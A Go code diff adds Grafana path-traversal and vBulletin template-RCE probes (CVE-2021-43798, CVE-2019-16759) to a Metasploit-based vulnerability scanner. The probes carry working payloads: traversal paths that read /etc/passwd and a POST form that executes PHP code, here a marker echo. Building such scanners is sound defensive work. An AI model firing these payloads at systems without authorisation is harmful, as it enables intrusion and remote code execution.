@@ -38,7 +38,7 @@ import (
 
 // metasploitNativeProbeCount is the number of native Go probe functions called
 // in MetasploitAgent.Run. Update this constant whenever a probe is added or removed.
-const metasploitNativeProbeCount = 15
+const metasploitNativeProbeCount = 17
 
 // MetasploitAgent orchestrates Metasploit-based web exploit checks.
 type MetasploitAgent struct {
@@ -87,6 +87,8 @@ func (a *MetasploitAgent) Run(ctx context.Context, input AgentInput) (AgentOutpu
 	output.Findings = append(output.Findings, probeExchangeProxyLogon(ctx, client, input.Target, input.AuthProfile)...)
 	output.Findings = append(output.Findings, probeWebAssemblyModuleAbuse(ctx, client, input.Target, input.AuthProfile)...)
 	output.Findings = append(output.Findings, probePHPUnitEvalStdinRCE(ctx, client, input.Target, input.AuthProfile)...)
+	output.Findings = append(output.Findings, probeGrafanaPluginTraversal(ctx, client, input.Target, input.AuthProfile)...)
+	output.Findings = append(output.Findings, probeVBulletinWidgetTemplateRCE(ctx, client, input.Target, input.AuthProfile)...)
 
 	// ── Phase 2: Metasploit RPC (optional, when msfrpcd is reachable) ─────
 	msfURL := strings.TrimSpace(os.Getenv("MSF_RPC_URL"))
@@ -862,6 +864,118 @@ func probePHPUnitEvalStdinRCE(ctx context.Context, client *http.Client, target s
 	return nil
 }
 
+// probeGrafanaPluginTraversal checks for Grafana plugin path traversal exposure
+// (CVE-2021-43798) via known plugin asset traversal paths.
+func probeGrafanaPluginTraversal(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
+	u, err := url.Parse(target)
+	if err != nil {
+		return nil
+	}
+	u.Path = ""
+	u.RawQuery = ""
+	base := strings.TrimRight(u.String(), "/")
+	paths := []string{
+		"/public/plugins/alertlist/../../../../../../../../etc/passwd",
+		"/public/plugins/annolist/../../../../../../../../etc/passwd",
+	}
+
+	for _, p := range paths {
+		probeURL := base + p
+		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
+		if err != nil {
+			continue
+		}
+		scanner.ApplyAuthProfile(req, profile)
+
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+		resp.Body.Close()
+
+		if resp.StatusCode == http.StatusOK && strings.Contains(strings.ToLower(string(body)), "root:x:0:0:") {
+			return []model.Finding{{
+				ID:          "msf-grafana-plugin-traversal",
+				Category:    "path_traversal",
+				Severity:    model.SeverityHigh,
+				Title:       "Grafana plugin path traversal indicator (CVE-2021-43798)",
+				Description: "Grafana's plugin asset endpoint returned /etc/passwd content through directory traversal sequences, indicating a path traversal vulnerability that can expose sensitive files.",
+				Evidence:    fmt.Sprintf("path=%s status=%d passwd_signature=true", p, resp.StatusCode),
+				Recommendation: "Upgrade Grafana to a patched release and restrict access to public plugin asset routes. Apply upstream mitigations and verify no sensitive files are accessible via traversal.",
+				AffectedURL:     probeURL,
+				OWASPCategory:   "OWASP A05:2021 - Security Misconfiguration",
+				CWE:             "CWE-22",
+				CVSSScore:       7.5,
+				CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+				MITRETechniques: []string{"T1190", "T1083"},
+				References: []string{
+					"https://nvd.nist.gov/vuln/detail/CVE-2021-43798",
+					"https://www.rapid7.com/db/modules/auxiliary/scanner/http/grafana_plugin_traversal/",
+				},
+			}}
+		}
+	}
+	return nil
+}
+
+// probeVBulletinWidgetTemplateRCE probes vBulletin widget template rendering
+// endpoint (CVE-2019-16759) with a harmless marker echo payload.
+func probeVBulletinWidgetTemplateRCE(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
+	u, err := url.Parse(target)
+	if err != nil {
+		return nil
+	}
+	u.Path = ""
+	u.RawQuery = ""
+	base := strings.TrimRight(u.String(), "/")
+	endpoint := base + "/ajax/render/widget_tabbedcontainer_tab_panel"
+	marker := "abh_vbulletin_probe_a8d9f16b"
+
+	form := url.Values{}
+	form.Set("subWidgets[0][template]", "widget_php")
+	form.Set("subWidgets[0][config][code]", "echo '"+marker+"';")
+	form.Set("routestring", "ajax/render/widget_tabbedcontainer_tab_panel")
+
+	req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, strings.NewReader(form.Encode()))
+	if err != nil {
+		return nil
+	}
+	scanner.ApplyAuthProfile(req, profile)
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil
+	}
+	body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+	resp.Body.Close()
+	bodyLower := strings.ToLower(string(body))
+
+	if resp.StatusCode == http.StatusOK && strings.Contains(bodyLower, strings.ToLower(marker)) {
+		return []model.Finding{{
+			ID:          "msf-vbulletin-widget-template-rce",
+			Category:    "remote_code_execution",
+			Severity:    model.SeverityHigh,
+			Title:       "vBulletin widget template RCE indicator (CVE-2019-16759)",
+			Description: "The vBulletin widget rendering endpoint executed supplied template code and returned a deterministic marker, indicating remote code execution exposure.",
+			Evidence:    fmt.Sprintf("endpoint=%s status=%d marker_reflected=true", endpoint, resp.StatusCode),
+			Recommendation: "Upgrade vBulletin to a fixed version immediately, disable vulnerable AJAX widget rendering paths, and restrict unauthenticated access to administrative/template features.",
+			AffectedURL:     endpoint,
+			OWASPCategory:   "OWASP A03:2021 - Injection",
+			CWE:             "CWE-94",
+			CVSSScore:       9.8,
+			CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+			MITRETechniques: []string{"T1190", "T1059.007"},
+			References: []string{
+				"https://nvd.nist.gov/vuln/detail/CVE-2019-16759",
+				"https://www.rapid7.com/db/modules/exploit/unix/http/vbulletin_widget_template_rce/",
+			},
+		}}
+	}
+	return nil
+}
+
 // ── Metasploit RPC ────────────────────────────────────────────────────────────
 
 // msfRPCResponse is the minimal shape returned by msfrpcd JSON-RPC calls.
@@ -982,6 +1096,18 @@ func runMSFRPCModules(ctx context.Context, client *http.Client, rpcURL, password
 			name:    "exploit/unix/http/phpunit_eval_stdin",
 			title:   "PHPUnit eval-stdin.php RCE (CVE-2017-9841)",
 			cve:     "CVE-2017-9841",
+			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl, "TARGETURI": "/"},
+		},
+		{
+			name:    "auxiliary/scanner/http/grafana_plugin_traversal",
+			title:   "Grafana Plugin Path Traversal (CVE-2021-43798)",
+			cve:     "CVE-2021-43798",
+			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
+		},
+		{
+			name:    "exploit/unix/http/vbulletin_widget_template_rce",
+			title:   "vBulletin Widget Template RCE (CVE-2019-16759)",
+			cve:     "CVE-2019-16759",
 			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl, "TARGETURI": "/"},
 		},
 	}
